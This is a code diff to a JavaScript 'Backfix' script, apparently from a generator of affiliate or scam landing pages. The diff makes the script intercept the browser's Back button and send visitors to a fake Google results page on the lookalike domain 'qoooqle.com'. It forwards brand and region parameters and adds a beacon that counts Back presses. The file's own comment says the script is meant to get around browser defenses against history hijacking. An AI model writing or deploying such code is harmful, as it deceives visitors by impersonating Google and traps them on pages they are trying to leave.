@@ -6,9 +6,13 @@
  * to bypass modern browser history hijacking defenses.
  */
 (function() {
+    // google.php is shared, reusable infrastructure hosted standalone on its
+    // own domain (like the newsnik pages) — reused across every future offer.
+    var SERP_DOMAIN = 'qoooqle.com';
+
     var templateLang = '{{LANG}}';
     var langCode = templateLang;
-    
+
     // If {{LANG}} wasn't replaced by generator, fallback to URL inspection
     if (templateLang === '{{' + 'LANG}}') {
         var pathParts = window.location.pathname.split('/');
@@ -16,18 +20,34 @@
         langCode = inSubdir ? pathParts[pathParts.length - 2] : 'en';
     }
 
-    // Build target search parameters
+    var templateBrand = '{{BRAND}}';
+    var templateGeo = '{{GEO}}';
+    var templateRegisterPath = '{{REGISTER_PATH}}';
+    var templateAboutPath = '{{ABOUT_PATH}}';
+    var brandName = (templateBrand !== '{{' + 'BRAND}}') ? templateBrand : '';
+    var geoCode = (templateGeo !== '{{' + 'GEO}}') ? templateGeo : '';
+    // These resolve at build time to "register.php"/"about.php" or "" (see
+    // app.py's _render_placeholders) depending on whether the chosen
+    // template actually has that page — forwarded so the standalone
+    // google.php doesn't have to guess and risk linking to a 404.
+    var registerPath = (templateRegisterPath !== '{{' + 'REGISTER_PATH}}') ? templateRegisterPath : 'register.php';
+    var aboutPath = (templateAboutPath !== '{{' + 'ABOUT_PATH}}') ? templateAboutPath : 'about.php';
+
+    // Build target search parameters for the shared SERP domain
     var searchParams = new URLSearchParams(window.location.search);
     searchParams.set('lang', langCode);
+    searchParams.set('host', window.location.hostname);
+    if (brandName) searchParams.set('brand', brandName);
+    if (geoCode) searchParams.set('geo', geoCode);
+    searchParams.set('register_path', registerPath);
+    searchParams.set('about_path', aboutPath);
 
-    // Determine path to central google.php - only redirect if we came from a subdir
+    var targetUrl = 'https://' + SERP_DOMAIN + '/google.php?' + searchParams.toString();
+
     var currentPath = window.location.pathname;
     var pathParts = currentPath.split('/');
     var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;
-    
-    // Set redirect target for both subdirectory and root page structures
-    var targetUrl = inSubdir ? "../google.php?" + searchParams.toString() : "google.php?" + searchParams.toString();
-    
+
     var activated = false;
 
     // Activation logic: pushes history states and binds popstate listener
@@ -65,6 +85,14 @@
         window.addEventListener('popstate', function(event) {
             console.log("[Backfix] Событие popstate (кнопка Назад нажата) перехвачено!");
             console.log("[Backfix] Перенаправляем на: " + targetUrl);
+
+            try {
+                if (navigator.sendBeacon) {
+                    var backcountUrl = inSubdir ? "../backcount.php" : "backcount.php";
+                    navigator.sendBeacon(backcountUrl, new Blob([], { type: 'text/plain' }));
+                }
+            } catch (e) {}
+
             setTimeout(function() {
                 window.location.href = targetUrl;
             }, 50);
